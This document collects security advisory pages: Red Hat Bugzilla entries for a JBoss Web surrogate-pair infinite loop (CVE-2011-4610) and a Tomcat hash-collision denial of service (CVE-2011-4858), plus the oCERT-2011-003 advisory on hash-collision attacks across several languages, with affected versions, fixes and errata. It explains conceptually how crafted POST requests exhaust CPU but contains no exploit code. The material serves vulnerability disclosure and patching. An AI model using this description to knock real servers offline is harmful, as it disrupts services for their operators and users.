45](show_bug.cgi?id=750521#c45)  errata-xmlrpc    2012-01-31 23:07:50 UTC  ``` This issue has been addressed in following products:    JBEAP 5 for RHEL 6   JBEAP 5 for RHEL 4   JBEAP 5 for RHEL 5  Via RHSA-2012:0074 <https://rhn.redhat.com/errata/RHSA-2012-0074.html>   ```  [Comment 47](show_bug.cgi?id=750521#c47)  errata-xmlrpc    2012-02-01 21:58:52 UTC  ``` This issue has been addressed in following products:    JBoss Operations Network 2.4.2  Via RHSA-2012:0089 <https://rhn.redhat.com/errata/RHSA-2012-0089.html>   ```  [Comment 48](show_bug.cgi?id=750521#c48)  errata-xmlrpc    2012-02-02 22:20:23 UTC  ``` This issue has been addressed in following products:    JBoss Enterprise Portal Platform 4.3 CP07  Via RHSA-2012:0091 <https://rhn.redhat.com/errata/RHSA-2012-0091.html>   ```  [Comment 53](show_bug.cgi?id=750521#c53)  errata-xmlrpc    2012-02-22 05:11:19 UTC  ``` This issue has been addressed in following products:  JBoss Enterprise BRMS Platform 5.2.0, JBoss Enterprise Portal Platform 5.2.0 and JBoss Enterprise SOA Platform 5.2.0  Via RHSA-2012:0325 <https://rhn.redhat.com/errata/RHSA-2012-0325.html>   ```  [Comment 59](show_bug.cgi?id=750521#c59)  errata-xmlrpc    2012-03-20 17:09:15 UTC  ``` This issue has been addressed in following products:    JBoss Operations Network 3.0.1  Via RHSA-2012:0406 <https://rhn.redhat.com/errata/RHSA-2012-0406.html>   ```  [Comment 65](show_bug.cgi?id=750521#c65)  errata-xmlrpc    2012-04-11 17:17:21 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 6  Via RHSA-2012:0475 <https://rhn.redhat.com/errata/RHSA-2012-0475.html>   ```  [Comment 66](show_bug.cgi?id=750521#c66)  errata-xmlrpc    2012-04-11 17:17:45 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 5  Via RHSA-2012:0474 <https://rhn.redhat.com/errata/RHSA-2012-0474.html>   ```  [Comment 68](show_bug.cgi?id=750521#c68)  errata-xmlrpc    2012-05-21 16:33:11 UTC  ``` This issue has been addressed in following products:    JBEWS 1.0 for RHEL 5   JBEWS 1.0 for RHEL 6  Via RHSA-2012:0680 <https://rhn.redhat.com/errata/RHSA-2012-0680.html>   ```  [Comment 69](show_bug.cgi?id=750521#c69)  errata-xmlrpc    2012-05-21 16:34:20 UTC  ``` This issue has been addressed in following products:    JBEWS 1.0  Via RHSA-2012:0679 <https://rhn.redhat.com/errata/RHSA-2012-0679.html>   ```  [Comment 70](show_bug.cgi?id=750521#c70)  errata-xmlrpc    2012-05-21 16:41:44 UTC  ``` This issue has been addressed in following products:    JBEWS 1.0  Via RHSA-2012:0681 <https://rhn.redhat.com/errata/RHSA-2012-0681.html>   ```  [Comment 71](show_bug.cgi?id=750521#c71)  errata-xmlrpc    2012-05-21 16:52:43 UTC  ``` This issue has been addressed in following products:    JBEWS 1.0 for RHEL 5   JBEWS 1.0 for RHEL 6  Via RHSA-2012:0682 <https://rhn.redhat.com/errata/RHSA-2012-0682.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=750521&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from bugzilla.redhat.com_dd3fda5f_20250126_072047.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D767871)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D767871)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D767871)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 767871

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 767871**](show_bug.cgi?id=767871)
(CVE-2011-4610)
- [CVE-2011-4610](https://access.redhat.com/security/cve/CVE-2011-4610) JBoss Web remote denial of service when surrogate pair character is placed at buffer boundary

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2011-4610 JBoss Web remote denial of service when surrogate pair characte...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2011-4610 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [769147](show_bug.cgi?id=769147) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [767873](show_bug.cgi?id=767873) [795277](show_bug.cgi?id=795277) [810065](show_bug.cgi?id=810065) | | TreeView+ | [depends on](buglist.cgi?bug_id=767871&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=767871&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2011-12-15 04:13 UTC by David Jorm | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2023-05-12 22:07 UTC ([History](show_activity.cgi?id=767871)) | | [CC List:](page.cgi?id=fields.html#cclist) | 7 users (show)  dknox jclere jdennis mjc pcheung security-response-team tkimura | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2012-03-07 06:50:31 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2012:0074](https://access.redhat.com/errata/RHSA-2012%3A0074) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:17 UTC | | Red Hat Product Errata | [RHSA-2012:0075](https://access.redhat.com/errata/RHSA-2012%3A0075) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:13 UTC | | Red Hat Product Errata | [RHSA-2012:0076](https://access.redhat.com/errata/RHSA-2012%3A0076) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:06 UTC | | Red Hat Product Errata | [RHSA-2012:0077](https://access.redhat.com/errata/RHSA-2012%3A0077) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:02 UTC | | Red Hat Product Errata | [RHSA-2012:0078](https://access.redhat.com/errata/RHSA-2012%3A0078) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Communications Platform 5.1.3 update | 2012-02-01 04:02:57 UTC | | Red Hat Product Errata | [RHSA-2012:0325](https://access.redhat.com/errata/RHSA-2012%3A0325) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-22 10:10:34 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=767871#c0)  David Jorm    2011-12-15 04:13:51 UTC  ``` JBoss Web will enter into an infinite loop when a surrogate pair character is placed at the boundary of an internal buffer. A remote attacker could exploit this flaw to trigger a denial-of-service attack against a JBoss Web server that is hosting applications with UTF-8 character encoding enabled, or that will include user-supplied UTF-8 strings in a response.   ```  [Comment 7](show_bug.cgi?id=767871#c7)  David Jorm    2012-01-06 05:04:13 UTC  ``` Acknowledgements:  Red Hat would like to thank NTT OSSC for reporting this issue.   ```  [Comment 8](show_bug.cgi?id=767871#c8)  errata-xmlrpc    2012-01-31 23:06:19 UTC  ``` This issue has been addressed in following products:    JBoss Communications Platform 5.1.3  Via RHSA-2012:0078 <https://rhn.redhat.com/errata/RHSA-2012-0078.html>   ```  [Comment 9](show_bug.cgi?id=767871#c9)  errata-xmlrpc    2012-01-31 23:06:47 UTC  ``` This issue has been addressed in following products:     JBoss Enterprise Web Platform 5.1.2  Via RHSA-2012:0077 <https://rhn.redhat.com/errata/RHSA-2012-0077.html>   ```  [Comment 10](show_bug.cgi?id=767871#c10)  errata-xmlrpc    2012-01-31 23:07:09 UTC  ``` This issue has been addressed in following products:    JBEWP 5 for RHEL 6   JBEWP 5 for RHEL 4   JBEWP 5 for RHEL 5  Via RHSA-2012:0076 <https://rhn.redhat.com/errata/RHSA-2012-0076.html>   ```  [Comment 11](show_bug.cgi?id=767871#c11)  errata-xmlrpc    2012-01-31 23:07:29 UTC  ``` This issue has been addressed in following products:    JBoss Enterprise Application Platform 5.1.2  Via RHSA-2012:0075 <https://rhn.redhat.com/errata/RHSA-2012-0075.html>   ```  [Comment 12](show_bug.cgi?id=767871#c12)  errata-xmlrpc    2012-01-31 23:07:55 UTC  ``` This issue has been addressed in following products:    JBEAP 5 for RHEL 6   JBEAP 5 for RHEL 4   JBEAP 5 for RHEL 5  Via RHSA-2012:0074 <https://rhn.redhat.com/errata/RHSA-2012-0074.html>   ```  [Comment 13](show_bug.cgi?id=767871#c13)  errata-xmlrpc    2012-02-22 05:11:26 UTC  ``` This issue has been addressed in following products:  JBoss Enterprise BRMS Platform 5.2.0, JBoss Enterprise Portal Platform 5.2.0 and JBoss Enterprise SOA Platform 5.2.0  Via RHSA-2012:0325 <https://rhn.redhat.com/errata/RHSA-2012-0325.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=767871&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.ocert.org_98101000_20250125_074728.html ===


**oCERT-2011-003 multiple implementations denial-of-service via hash algorithm collision**

**Description**:

A variety of programming languages suffer from a denial-of-service (DoS)
condition against storage functions of key/value pairs in hash data structures,
the condition can be leveraged by exploiting predictable collisions in the
underlying hashing algorithms.

The issue finds particular exposure in web server applications and/or
frameworks. In particular, the lack of sufficient limits for the number of
parameters in POST requests in conjunction with the predictable collision
properties in the hashing functions of the underlying languages can render web
applications vulnerable to the DoS condition. The attacker, using specially
crafted HTTP requests, can lead to a 100% of CPU usage which can last up to
several hours depending on the targeted application and server performance, the
amplification effect is considerable and requires little bandwidth and time on
the attacker side.

The condition for predictable collisions in the hashing functions has
been reported for the following language implementations:
[Java](http://www.java.com),
[JRuby](http://jruby.org/),
[PHP](http://www.php.net/),
[Python](http://python.org/),
[Rubinius](http://rubini.us/),
[Ruby](http://www.ruby-lang.org/).
In the case of the Ruby language, the 1.9.x branch is not affected
by the predictable collision condition since this version includes a
randomization of the hashing function.

The vulnerability outlined in this advisory is practically identical to the one
reported in 2003 and described in the paper
[Denial of Service via Algorithmic Complexity Attacks](http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003.pdf)
which affected the Perl language.

The reporters own advisory can be found at <http://www.nruns.com/_downloads/advisory28122011.pdf>

**Affected version**:

[Java](http://www.java.com), all versions

[JRuby](http://jruby.org/) <= 1.6.5

[PHP](http://www.php.net/) <= 5.3.8, <= 5.4.0RC3

[Python](http://python.org/) <= 2.6.7, <= 2.7.3, <= 3.1.4, <= 3.2.2

[Rubinius](http://rubini.us/), all versions

[Ruby](http://www.ruby-lang.org/) <= 1.8.7-p356

[Apache Geronimo](http://geronimo.apache.org/), all versions

[Apache Tomcat](http://tomcat.apache.org/) <= 5.5.34, <= 6.0.34, <= 7.0.22

[Oracle Glassfish](http://glassfish.java.net/) <= 3.1.1

[Jetty](http://www.eclipse.org/jetty/) <= 7.5.4

[Plone](http://plone.org/), all versions

[Rack](http://rack.rubyforge.org/) <= 1.3.5, <= 1.2.4, <= 1.1.2

[V8 JavaScript Engine](http://code.google.com/p/v8/), all versions

**Fixed version**:

[Java](http://www.java.com), N/A

[JRuby](http://jruby.org/) >= 1.6.5.1

[PHP](http://www.php.net/) >= 5.3.9, >= 5.4.0RC4

[Python](http://python.org/) >= 2.6.8, >= 2.7.3, >= 3.1.5, >= 3.2.3 (hash randomization disabled by default, use -R flag to enable it)

[Rubinius](http://rubini.us/), N/A

[Ruby](http://www.ruby-lang.org/) >= 1.8.7-p357, 1.9.x

[Apache Geronimo](http://geronimo.apache.org/), N/A

[Apache Tomcat](http://tomcat.apache.org/) >= 5.5.35, >= 6.0.35, >= 7.0.23

[Oracle Glassfish](http://glassfish.java.net/), N/A (addressed in Oracle Critical Patch Update - January 2012)

[Jetty](http://www.eclipse.org/jetty/) >= 7.6.0.RC3

[Plone](http://plone.org/), N/A

[Rack](http://rack.rubyforge.org/) >= 1.4.0, >= 1.3.6, >= 1.2.5, >= 1.1.3

[V8 JavaScript Engine](http://code.google.com/p/v8/), N/A

**Credit**: vulnerability report and PoC code received from Alexander Klink <alexander.klink AT nruns.com>
and Julian Waelde <jwaelde AT cdc.informatik.tu-darmstadt.de>.

**CVE**: [CVE-2011-5034](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5034) (Apache Geronimo),
[CVE-2011-5035](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5035) (Oracle Glassfish),
[CVE-2011-4461](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4461) (Jetty),
[CVE-2011-4838](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4838) (JRuby),
[CVE-2011-4885](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4885) (PHP),
[CVE-2011-4462](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4462) (Plone),
[CVE-2011-5036](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5036) (Rack),
[CVE-2011-4815](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4815) (Ruby),
[CVE-2011-4858](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4858) (Apache Tomcat),
[CVE-2011-5037](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5037) (V8 JavaScript Engine)

**Timeline**:

2011-09-25: vulnerability report received, reporters set embargo date to December 27th

2011-10-18: contacted maintainers of Apache Tomcat, Apache Geronimo, Jetty, Java, Plone, Zope, V8

2011-11-01: contacted maintainers of Ruby on Rails, Ruby, Python, PHP

2011-11-01: contacted affected distributions

2011-11-02: contacted JRuby maintainer

2011-12-13: contacted Ruby Installer maintainer

2011-12-14: assigned CVE for Ruby

2011-12-15: assigned CVE for JRuby

2011-12-13: contacted Rack maintainer

2011-12-16: assigned CVE for Apache Tomcat

2011-12-21: assigned CVE for PHP

2011-12-28: advisory release

2011-12-29: updated information about Rack affected/fixed versions

2011-12-30: assigned CVEs for Apache Geronimo, Oracle Glassfish, Rack, V8 JavaScript Engine

2012-01-03: corrected Apache Tomcat CVE reference

2012-01-17: updated information about Jetty affected/fixed versions

2012-01-17: updated information about Oracle Glassfish fixed versions

2012-02-27: updated information about Python fixed versions

**References**:

<http://www.nruns.com/_downloads/advisory28122011.pdf>

<http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003.pdf>

<http://svn.php.net/viewvc?view=revision&revision=321003> (unstable, not final)

<http://svn.php.net/viewvc?view=revision&revision=321040> (unstable, not final)

<https://gist.github.com/52bbc6b9cc19ce330829>



=== Content from bugzilla.redhat.com_18970ac6_20250126_072106.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D750521)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D750521)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D750521)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 750521

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 750521**](show_bug.cgi?id=750521)
(CVE-2011-4084, CVE-2011-4858)
- [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) tomcat: hash table collisions CPU usage DoS (oCERT-2011-003)

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2011-4858 tomcat: hash table collisions CPU usage DoS (oCERT-2011-003)

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2011-4084, CVE-2011-4858 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [751657](show_bug.cgi?id=751657) [751658](show_bug.cgi?id=751658) [751659](show_bug.cgi?id=751659) [751660](show_bug.cgi?id=751660) [751661](show_bug.cgi?id=751661) [751662](show_bug.cgi?id=751662) [751663](show_bug.cgi?id=751663) [751664](show_bug.cgi?id=751664) [751665](show_bug.cgi?id=751665) [751666](show_bug.cgi?id=751666) [771526](show_bug.cgi?id=771526) [771532](show_bug.cgi?id=771532) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [750525](show_bug.cgi?id=750525) [hashdos, oCERT-2011-003](show_bug.cgi?id=770929 "CLOSED ERRATA - Hash table collisions CPU usage DoS (oCERT-2011-003)") [795277](show_bug.cgi?id=795277) [804887](show_bug.cgi?id=804887) [810065](show_bug.cgi?id=810065) [811419](show_bug.cgi?id=811419) | | TreeView+ | [depends on](buglist.cgi?bug_id=750521&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=750521&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2011-11-01 13:21 UTC by Jan Lieskovsky | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2023-05-12 14:58 UTC ([History](show_activity.cgi?id=750521)) | | [CC List:](page.cgi?id=fields.html#cclist) | 21 users (show)  aogburn awnuk ccoleman daxiezhi djorm dknox jdennis jlee jpazdziora mfuruta mharmsen mhasko ole.d patrickm pcheung sappleto security-response-team tkramer tromey vdanen yohmura | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2012-06-06 06:18:19 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2012:0041](https://access.redhat.com/errata/RHSA-2012%3A0041) | 0 | normal | SHIPPED\_LIVE | Moderate: jbossweb security update | 2012-01-19 22:21:56 UTC | | Red Hat Product Errata | [RHSA-2012:0074](https://access.redhat.com/errata/RHSA-2012%3A0074) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:17 UTC | | Red Hat Product Errata | [RHSA-2012:0075](https://access.redhat.com/errata/RHSA-2012%3A0075) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:13 UTC | | Red Hat Product Errata | [RHSA-2012:0076](https://access.redhat.com/errata/RHSA-2012%3A0076) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:06 UTC | | Red Hat Product Errata | [RHSA-2012:0077](https://access.redhat.com/errata/RHSA-2012%3A0077) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:02 UTC | | Red Hat Product Errata | [RHSA-2012:0078](https://access.redhat.com/errata/RHSA-2012%3A0078) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Communications Platform 5.1.3 update | 2012-02-01 04:02:57 UTC | | Red Hat Product Errata | [RHSA-2012:0089](https://access.redhat.com/errata/RHSA-2012%3A0089) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Operations Network 2.4.2 update | 2012-02-02 02:57:57 UTC | | Red Hat Product Errata | [RHSA-2012:0091](https://access.redhat.com/errata/RHSA-2012%3A0091) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Enterprise Portal Platform 4.3 CP07 update | 2012-02-03 03:19:04 UTC | | Red Hat Product Errata | [RHSA-2012:0325](https://access.redhat.com/errata/RHSA-2012%3A0325) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-22 10:10:34 UTC | | Red Hat Product Errata | [RHSA-2012:0406](https://access.redhat.com/errata/RHSA-2012%3A0406) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Operations Network 3.0.1 update | 2012-03-20 21:08:42 UTC | | Red Hat Product Errata | [RHSA-2012:0474](https://access.redhat.com/errata/RHSA-2012%3A0474) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat5 security update | 2012-04-11 22:07:09 UTC | | Red Hat Product Errata | [RHSA-2012:0475](https://access.redhat.com/errata/RHSA-2012%3A0475) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat6 security update | 2012-04-11 22:17:21 UTC | | Red Hat Product Errata | [RHSA-2012:0679](https://access.redhat.com/errata/RHSA-2012%3A0679) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat5 security and bug fix update | 2012-05-21 20:28:06 UTC | | Red Hat Product Errata | [RHSA-2012:0680](https://access.redhat.com/errata/RHSA-2012%3A0680) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat5 security and bug fix update | 2012-05-21 20:27:56 UTC | | Red Hat Product Errata | [RHSA-2012:0681](https://access.redhat.com/errata/RHSA-2012%3A0681) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat6 security and bug fix update | 2012-05-21 20:38:23 UTC | | Red Hat Product Errata | [RHSA-2012:0682](https://access.redhat.com/errata/RHSA-2012%3A0682) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat6 security and bug fix update | 2012-05-21 20:48:57 UTC | |  |
